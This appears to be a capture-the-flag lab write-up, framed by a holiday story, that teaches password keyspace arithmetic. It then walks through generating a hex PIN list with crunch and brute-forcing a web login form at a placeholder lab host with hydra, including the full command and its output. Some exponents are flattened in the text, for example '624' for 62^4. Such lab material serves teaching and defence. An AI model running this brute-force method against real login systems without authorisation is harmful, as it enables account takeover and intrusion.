Everyone was shocked to discover that several critical systems were locked. But the chaos didn’t end there: the doors to the IT rooms and related network infrastructure were also locked! Adding to the mayhem, during the lockdown, the doors closed suddenly on Detective Frost-eau. As he tried to escape, his snow arm got caught, and he ended up losing it! He’s now determined to catch the perpetrator, no matter the cost.

It seems that whoever did this had one goal: to disrupt business operations and stop gifts from being delivered on time. Now, the team must resort to backup tapes to recover the systems. To their surprise, they find out they can’t unlock the IT room door! The password to access the control systems has been changed. The only solution is to hack back in to retrieve the backup tapes.

**Learning Objectives**

After completing this task, you will understand:

- Password complexity and the number of possible combinations
- How the number of possible combinations affects the feasibility of brute force attacks
- Generating password combinations using ```crunch```
- Trying out passwords automatically using ```hydra```

**Feasibility of Brute Force**

In this section, we will answer the following three questions:

- How many different PIN codes do we have?
- How many different passwords can we generate?
- How long does it take to find the password by brute force?

**Counting the PIN Codes**

Many systems rely on PIN codes or passwords to authenticate users (authenticate means proving a user’s identity). Such systems can be an easy target for all sorts of attacks unless proper measures are taken. Today, we discuss brute force attacks, where an adversary tries all possible combinations of a given password.

How many passwords does the attacker have to try, and how long will it take?

Consider a scenario where we need to select a PIN code of four digits. 

How many four-digit PIN codes are there? The total would be 10,000 different PIN codes: ```0000```, ```0001```, ```0002```,…, ```9998```, and ```9999```. 
Mathematically speaking, that is 10×10×10×10 or simply 104 different PIN codes that can be made up of four digits.

**Counting the Passwords**

Let’s consider an imaginary scenario where the password is exactly four characters, and each character can be:

- A digit: We have 10 digits (0 to 9)
- An uppercase English letter: We have 26 letters (A to Z)
- A lowercase English letter: We have 26 letters (a to z)

Therefore, each character can be one of 62 different choices. Consequently, if the password is four characters, we can make 62×62×62×62 = 624 = 14,776,336 different passwords.

To make the password even more complex, we can use symbols, adding more than 30 characters to our set of choices.

![allowed](https://github.com/schoto/Advent-of-Cyber-2023/assets/69323411/6c02ba13-41c2-4da6-87a0-ba0bd71c9676)

**How Long Does It Take To Brute Force the Password**

14 million is a huge number, but we can use a computer system to try out all the possible password combinations, i.e., brute force the password. If trying a password takes 0.001 seconds due to system throttling (i.e., we can only try 1,000 passwords per second), finding the password will only take up to four hours.

If you are curious about the maths, 624×0.001 = 14, 776 seconds is the number of seconds necessary to try out all the passwords. We can find the number of hours needed to try out all the passwords by dividing by 3,600 (1 hour = 3,600 seconds): 14,776/3,600 = 4.1 hours.

In reality, the password can be closer to the beginning of the list or closer to the end. Therefore, on average, we can expect to find the password in around two hours, i.e., 4.1/2 = 2.05 hours. Hence, a four-character password is generally considered insecure.

We should note that in this hypothetical example, we are assuming that we can try 1,000 passwords every second. Few systems would let us go this fast. After a few incorrect attempts, most would lock us out or impose frustratingly long waiting periods. On the other hand, with the password hash, we can try passwords offline. In this case, we would only be limited by how fast our computer is.

We can make passwords more secure by increasing the password complexity. This can be achieved by specifying a minimum password length and character variety. For example, the character variety might require at least one uppercase letter, one lowercase letter, one digit, and one symbol.

**Generating the Password List**

The numeric keypad shows 16 characters, 0 to 9 and A to F, i.e., the hexadecimal digits. We need to prepare a list of all the PIN codes that match this criteria. We will use Crunch, a tool that generates a list of all possible password combinations based on given criteria. We need to issue the following command:

```crunch 3 3 0123456789ABCDEF -o 3digits.txt```

The command above specifies the following:

- ```3``` the first number is the minimum length of the generated password
- ```3``` the second number is the maximum length of the generated password
- ```0123456789ABCDEF``` is the character set to use to generate the passwords
- ```-o 3digits.txt``` saves the output to the ```3digits.txt``` file

To prepare our list, run the above command on the AttackBox’s terminal.

```
root@AttackBox# crunch 3 3 0123456789ABCDEF -o 3digits.txt
Crunch will now generate the following amount of data: 16384 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 4096
crunch: 100% completed generating output
```

After executing the command above, we will have ```3digits.txt``` ready to brute force the website.

**Using the Password List**

Manually trying out PIN codes is a very daunting task. Luckily, we can use an automated tool to try our generated digit combinations. One of the most solid tools for trying passwords is Hydra.

Before we start, we need to view the page’s HTML code. We can do that by right-clicking on the page and selecting “View Page Source”. You will notice that:

- The method is ```post```
- The URL is ```http://MACHINE_IP:8000/login.php```
- The PIN code value is sent with the name ```pin```

![method](https://github.com/schoto/Advent-of-Cyber-2023/assets/69323411/b9e891d9-a888-4220-8bf4-6bc6fac57b2b)

In other words, the main login page http://MACHINE_IP:8000/pin.php receives the input from the user and sends it to ```/login.php``` using the name ```pin```.

These three pieces of information, ```post```, ```/login.php```, and ```pin```, are necessary to set the arguments for Hydra.

We will use ```hydra``` to test every possible password that can be put into the system. The command to brute force the above form is:

```
hydra -l '' -P 3digits.txt -f -v MACHINE_IP http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
```

The command above will try one password after another in the ```3digits.txt``` file. It specifies the following:

- ```-l ''``` indicates that the login name is blank as the security lock only requires a password
- ```-P 3digits.txt``` specifies the password file to use
- ```-f``` stops Hydra after finding a working password
- ```-v``` provides verbose output and is helpful for catching errors
```MACHINE_IP``` is the IP address of the target
```http-post-form``` specifies the HTTP method to use
- ```"/login.php:pin=^PASS^:Access denied"``` has three parts separated by ```:```

```/login.php``` is the page where the PIN code is submitted

```pin=^PASS^``` will replace ```^PASS^``` with values from the password list

```Access denied``` indicates that invalid passwords will lead to a page that contains the text “Access denied”

- ```-s 8000``` indicates the port number on the target

It’s time to run ```hydra``` and discover the password. Please note that in this case, we expect ```hydra``` to take three minutes to find the password. Below is an example of running the command above:

```
root@AttackBox# hydra -l '' -P 3digits.txt -f -v MACHINE_IP http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-19 17:38:42
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1109 login tries (l:1/p:1109), ~70 tries per task
[DATA] attacking http-post-form://MACHINE_IP:8000/login.php:pin=^PASS^:Access denied
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] Page redirected to http[s]://MACHINE_IP:8000/error.php
[VERBOSE] Page redirected to http[s]://MACHINE_IP:8000/error.php
[VERBOSE] Page redirected to http[s]://MACHINE_IP:8000/error.php
[...]
[VERBOSE] Page redirected to http[s]://MACHINE_IP:8000/error.php
[8000][http-post-form] host: MACHINE_IP   password: [redacted]
[STATUS] attack finished for MACHINE_IP (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-19 17:39:24
```

The command above shows that ```hydra``` has successfully found a working password. On the AttackBox, running the above command should finish within three minutes.

We have just discovered the new password for the IT server room. Please enter the password you have just found at http://MACHINE_IP:8000/ using the AttackBox’s web browser. This should give you access to control the door.

Now, we can retrieve the backup tapes, which we’ll soon use to rebuild our systems.

**Q/A**

![answa](https://github.com/schoto/Advent-of-Cyber-2023/assets/69323411/5457e2b3-0d15-46a7-84e3-94b451f43910)
